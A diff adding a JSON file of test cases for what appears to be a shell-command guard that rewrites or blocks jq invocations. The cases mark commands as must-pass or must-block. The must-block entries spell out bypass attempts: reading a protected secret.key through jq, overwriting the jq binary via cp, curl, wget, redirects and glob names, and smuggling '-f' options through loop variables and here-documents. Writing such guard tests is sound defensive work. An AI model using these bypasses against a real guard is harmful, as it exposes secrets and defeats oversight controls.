@@ -1,0 +1,612 @@
+[
+  {
+    "id": "script-then-jq",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "94S-2135 case: a script run before a jq that reads the to_entries field names",
+    "command": "python3 edit.py; jq -r 'to_entries[] | .key' hooks.json"
+  },
+  {
+    "id": "cmp-echo-then-jq",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "#626 case: a jq after a cmp segment and an echo",
+    "command": "jq . a.json | cmp - b.json && echo same; jq -r '.x | .key' a.json"
+  },
+  {
+    "id": "make-then-jq",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "make before a jq field filter",
+    "command": "make build; jq -r '.[] | .key' a.json"
+  },
+  {
+    "id": "git-and-jq",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "git before a jq object filter",
+    "command": "git status && jq -c 'to_entries[] | {k: .key}' a.json"
+  },
+  {
+    "id": "cmp-or-jq",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a jq after ||",
+    "command": "cmp a.json b.json || jq '.key' a.json"
+  },
+  {
+    "id": "script-then-jq-sed",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a sed after a later-segment jq is left as written and does not stop the rewrite",
+    "command": "python3 edit.py; jq -r '.key' a.json | sed 's/^/x /'"
+  },
+  {
+    "id": "script-then-two-jq",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "two jq segments after a script",
+    "command": "python3 edit.py; jq -r '.key' a.json; jq -r '.a.key' b.json"
+  },
+  {
+    "id": "for-literal-operand",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a jq in a for body with a literal operand",
+    "command": "for f in a.json b.json; do jq -r 'to_entries[] | .key' a.json; done"
+  },
+  {
+    "id": "for-loop-var-operand",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a jq in a for body reading the loop variable, whose values are literal file names",
+    "command": "for f in a.json b.json; do jq -r 'to_entries[] | .key' \"$f\"; done"
+  },
+  {
+    "id": "for-loop-var-braced",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "the braced loop variable as the operand, loop output piped to sort",
+    "command": "for f in a.json b.json; do jq -r '.key' \"${f}\"; done | sort"
+  },
+  {
+    "id": "while-body",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a jq in a while body",
+    "command": "while true; do jq -r '.key' a.json; sleep 1; done"
+  },
+  {
+    "id": "if-body",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a jq in an if body",
+    "command": "if test -f a.json; then jq -r '.key' a.json; fi"
+  },
+  {
+    "id": "test-bracket-then-jq",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a test and make before jq",
+    "command": "test -f a.json && make; jq -r '.key' a.json"
+  },
+  {
+    "id": "newline-then-jq",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a jq on the line after a script",
+    "command": "python3 edit.py\njq -r 'to_entries[] | .key' a.json"
+  },
+  {
+    "id": "script-then-jq-operand",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a protected file as the input operand of a later-segment jq",
+    "command": "python3 edit.py; jq -r '.key' secret.key"
+  },
+  {
+    "id": "script-then-jq-stdin",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a protected file behind < of a later-segment jq",
+    "command": "python3 edit.py; jq -r '.key' < secret.key"
+  },
+  {
+    "id": "script-then-jq-rawfile",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a protected file as a --rawfile path",
+    "command": "python3 edit.py; jq -n --rawfile k secret.key '$k'"
+  },
+  {
+    "id": "script-then-jq-slurpfile",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a protected file as a --slurpfile path",
+    "command": "python3 edit.py; jq -n --slurpfile k secret.key '$k'"
+  },
+  {
+    "id": "script-then-jq-from-file",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a protected file as the -f program file",
+    "command": "python3 edit.py; jq -f prog.key a.json"
+  },
+  {
+    "id": "script-then-jq-from-file-long",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a protected file as the --from-file program file",
+    "command": "python3 edit.py; jq --from-file prog.key a.json"
+  },
+  {
+    "id": "script-then-jq-late-f",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "-f after the program word makes that word a file",
+    "command": "python3 edit.py; jq '.key' -f prog.jq"
+  },
+  {
+    "id": "for-body-operand",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a protected file as the operand of a jq in a loop body",
+    "command": "for f in a.json b.json; do jq -r '.key' secret.key; done"
+  },
+  {
+    "id": "for-list-protected",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a protected file in the list of the loop variable jq reads",
+    "command": "for f in a.json secret.key; do jq -r '.key' \"$f\"; done"
+  },
+  {
+    "id": "alias-anywhere",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "an alias definition anywhere keeps the old rule",
+    "command": "alias ll=ls; make; jq '.key' a.json"
+  },
+  {
+    "id": "hash-anywhere",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "hash anywhere keeps the old rule",
+    "command": "hash -r; make; jq '.key' a.json"
+  },
+  {
+    "id": "enable-anywhere",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "enable anywhere keeps the old rule",
+    "command": "enable -n test; make; jq '.key' a.json"
+  },
+  {
+    "id": "eval-before",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "eval before jq",
+    "command": "make; eval x; jq '.key' a.json"
+  },
+  {
+    "id": "source-before",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a sourced script before jq",
+    "command": "make; . ./tools.sh; jq '.key' a.json"
+  },
+  {
+    "id": "source-word-before",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "source before jq",
+    "command": "make; source ./tools.sh; jq '.key' a.json"
+  },
+  {
+    "id": "function-before",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a function definition before jq",
+    "command": "make; f() { :; }; jq '.key' a.json"
+  },
+  {
+    "id": "path-assign-before",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a PATH assignment before jq",
+    "command": "PATH=./bin:/usr/bin; make; jq '.key' a.json"
+  },
+  {
+    "id": "path-export-before",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "export PATH before jq",
+    "command": "export PATH; make; jq '.key' a.json"
+  },
+  {
+    "id": "relative-path-entry",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a relative PATH entry lets an earlier cd or file write change which jq runs",
+    "command": "make; jq '.key' a.json",
+    "path_prefix": "bin"
+  },
+  {
+    "id": "jq-variable",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "jq named by a variable",
+    "command": "make; $J '.key' a.json"
+  },
+  {
+    "id": "jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "jq named by a glob",
+    "command": "make; j? '.key' a.json"
+  },
+  {
+    "id": "jq-env",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "jq through env",
+    "command": "make; env jq '.key' a.json"
+  },
+  {
+    "id": "jq-xargs",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "jq through xargs",
+    "command": "make; xargs jq '.key' < list.txt"
+  },
+  {
+    "id": "jq-loop-var-name",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "jq as a loop variable",
+    "command": "for jq in a b; do make; done; jq '.key' a.json"
+  },
+  {
+    "id": "while-read-var",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a loop variable read from input may be -f",
+    "command": "while read -r f; do jq -r '.key' \"$f\"; done < list.txt"
+  },
+  {
+    "id": "for-dash-value",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a loop value that is an option",
+    "command": "for v in --from-file a.json; do jq -r '.key' \"$v\"; done"
+  },
+  {
+    "id": "for-glob-list",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a glob in the loop list may expand to an option",
+    "command": "for f in *.json; do jq -r '.key' \"$f\"; done"
+  },
+  {
+    "id": "for-var-reassigned",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "the loop variable is assigned again",
+    "command": "for f in a.json; do f=-f; jq -r '.key' \"$f\"; done"
+  },
+  {
+    "id": "for-var-unquoted",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "an unquoted loop variable",
+    "command": "for f in a.json; do jq -r '.key' $f; done"
+  },
+  {
+    "id": "for-var-suffixed",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a loop variable glued to other text",
+    "command": "for f in a; do jq -r '.key' \"$f.json\"; done"
+  },
+  {
+    "id": "for-var-before-loop",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "the loop variable read before its loop holds an inherited value",
+    "command": "jq -r '.key' \"$f\"; for f in a.json; do :; done"
+  },
+  {
+    "id": "for-var-after-skipped-loop",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "the loop variable read after a loop that may not run",
+    "command": "if false; then for f in a.json; do :; done; fi; jq -r '.key' \"$f\""
+  },
+  {
+    "id": "for-var-after-loop",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "the loop variable read after its loop",
+    "command": "for f in a.json; do :; done; jq -r '.key' \"$f\""
+  },
+  {
+    "id": "for-var-after-do-word",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a do word that is an argument does not extend the loop body",
+    "command": "if false; then for f in a.json; do echo do; done; fi; jq -r '.key' \"$f\""
+  },
+  {
+    "id": "cp-to-jq",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "cp writes a file named jq",
+    "command": "cp ./tool ~/bin/jq; jq '.key' a.json"
+  },
+  {
+    "id": "cp-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "cp to a glob that can name jq",
+    "command": "cp ./tool ~/bin/j?; jq '.key' a.json"
+  },
+  {
+    "id": "mv-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "mv to a glob that can name jq",
+    "command": "mv tool bin/j*; jq '.key' a.json"
+  },
+  {
+    "id": "ln-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "ln to a bracket glob that can name jq",
+    "command": "ln -s /bin/cat bin/[j]q; jq '.key' a.json"
+  },
+  {
+    "id": "install-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "install to a glob",
+    "command": "install tool bin/j[q]; jq '.key' a.json"
+  },
+  {
+    "id": "tee-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "tee to a glob",
+    "command": "tee bin/j? < tool; jq '.key' a.json"
+  },
+  {
+    "id": "curl-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "curl -o to a glob",
+    "command": "curl -o bin/j? https://example.invalid/t; jq '.key' a.json"
+  },
+  {
+    "id": "wget-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "wget -O to a glob",
+    "command": "wget -O bin/j? https://example.invalid/t; jq '.key' a.json"
+  },
+  {
+    "id": "redirect-to-jq",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "an output redirect to a file named jq",
+    "command": "make > bin/jq; jq '.key' a.json"
+  },
+  {
+    "id": "redirect-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "an output redirect to a glob",
+    "command": "make > bin/j?; jq '.key' a.json"
+  },
+  {
+    "id": "redirect-glued-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a glued output redirect to a glob",
+    "command": "make >bin/j*; jq '.key' a.json"
+  },
+  {
+    "id": "background-before",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a background job before jq keeps the old rule",
+    "command": "make & jq '.key' a.json"
+  },
+  {
+    "id": "tilde-command-later",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a tilde command name can expand to a dot command",
+    "command": "make; HOME=.; ~ /dev/stdin; jq '.key' a.json"
+  },
+  {
+    "id": "extglob-command-later",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "an extglob command name can define an alias",
+    "command": "make; @(al)ias 'x=. /dev/stdin'\nx\njq '.key' a.json"
+  },
+  {
+    "id": "sed-after-script",
+    "expected_status": 2,
+    "classification": "residual",
+    "description": "a sed past the first pipeline keeps its old rule, also next to a rewritten jq: this change covers jq only",
+    "command": "python3 edit.py; jq -r '.a' a.json; sed 's/\\.key$//' list.txt"
+  },
+  {
+    "id": "heredoc-body-xargs",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a jq line in a here-document body is data a later command may open",
+    "command": "xargs cat <<'EOF'\njq .key\nEOF"
+  },
+  {
+    "id": "heredoc-body-piped",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a here-document body piped to xargs",
+    "command": "cat <<'EOF' | xargs cat\njq .key\nEOF"
+  },
+  {
+    "id": "heredoc-body-file",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a here-document body written to a list file",
+    "command": "cat > l.txt <<'EOF'\njq .key\nEOF\nxargs cat < l.txt"
+  },
+  {
+    "id": "heredoc-body-do-done",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "do and done lines in here-document bodies do not move the loop body",
+    "command": "if false; then for f in a.json; do cat <<'EOF'\ndo\nEOF\ndone; fi; jq -r '.key' \"$f\"; cat <<'EOF'\ndone\nEOF"
+  },
+  {
+    "id": "var-glued-suffix",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "\"$f\"n reads as the loop variable fn once quoting is dropped",
+    "command": "f=-f; for fn in a.json; do jq '.key' \"$f\"n; done"
+  },
+  {
+    "id": "var-glued-quoted-suffix",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "\"$f\"\"n\" reads as the loop variable fn once quoting is dropped",
+    "command": "f=-f; for fn in a.json; do jq '.key' \"$f\"\"n\"; done"
+  },
+  {
+    "id": "rsync-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "rsync to a glob",
+    "command": "rsync tool bin/j?; jq '.key' a.json"
+  },
+  {
+    "id": "scp-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "scp to a glob",
+    "command": "scp host:tool bin/j?; jq '.key' a.json"
+  },
+  {
+    "id": "dd-to-jq-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "dd to a glob",
+    "command": "dd if=tool of=bin/j?; jq '.key' a.json"
+  },
+  {
+    "id": "glob-read-loop-var",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a glob read target can name the loop variable and set it to -f",
+    "command": "echo -f > xx; for Makefile in a.json; do read -r Makefil? < xx; jq '.key' \"$Makefile\"; done"
+  },
+  {
+    "id": "glob-read-short-var",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a one-character glob can name a one-letter loop variable",
+    "command": "for f in a.json; do read -r ? < xx; jq '.key' \"$f\"; done"
+  },
+  {
+    "id": "glob-mapfile-var",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a mapfile glob target",
+    "command": "for f in a.json; do mapfile -t ? < xx; jq '.key' \"$f\"; done"
+  },
+  {
+    "id": "glob-bracket-var",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a bracket glob can name the loop variable",
+    "command": "for fn in a.json; do read -r [f]n < xx; jq '.key' \"$fn\"; done"
+  },
+  {
+    "id": "command-cp-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a writer behind command",
+    "command": "command cp x /opt/homebrew/bin/j?; jq '.key' a.json"
+  },
+  {
+    "id": "env-cp-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a writer behind env",
+    "command": "env cp x /opt/homebrew/bin/j?; jq '.key' a.json"
+  },
+  {
+    "id": "ditto-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a writer outside any list",
+    "command": "ditto x /opt/homebrew/bin/j?; jq '.key' a.json"
+  },
+  {
+    "id": "sed-w-glob",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a glob inside a quoted sed w command is a literal name: no shell expands it, so it cannot name jq",
+    "command": "sed -n 'w /opt/homebrew/bin/j?' x; jq '.key' a.json"
+  },
+  {
+    "id": "bracket-first-close-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a bracket set that starts with ] can name jq",
+    "command": "cp x bin/[]j]q; jq '.key' a.json"
+  },
+  {
+    "id": "negated-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a zsh negated glob can name jq",
+    "command": "tee bin/^x < t; jq '.key' a.json"
+  },
+  {
+    "id": "glued-redirect-cwd-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a glued redirect to a glob with no directory",
+    "command": "make >j*; jq '.key' a.json"
+  },
+  {
+    "id": "option-value-glob",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "an option value glob after =",
+    "command": "curl --output=bin/j? https://example.invalid/t; jq '.key' a.json"
+  },
+  {
+    "id": "glob-unrelated-ok",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "a glob that cannot name jq or a loop variable does not stop the rewrite",
+    "command": "python3 edit.py 'x.*'; jq -r 'to_entries[] | .key' a.json"
+  },
+  {
+    "id": "jq-brackets-loop-var",
+    "expected_status": 0,
+    "classification": "must-pass",
+    "description": "jq brackets in a loop body with the loop variable",
+    "command": "for f in a.json b.json; do jq -r '.[]|.key' \"$f\"; done"
+  },
+  {
+    "id": "sed-w-literal-jq",
+    "expected_status": 2,
+    "classification": "must-block",
+    "description": "a sed w command to a literal jq path",
+    "command": "sed -n 'w /opt/homebrew/bin/jq' x; jq '.key' a.json"
+  }
+]
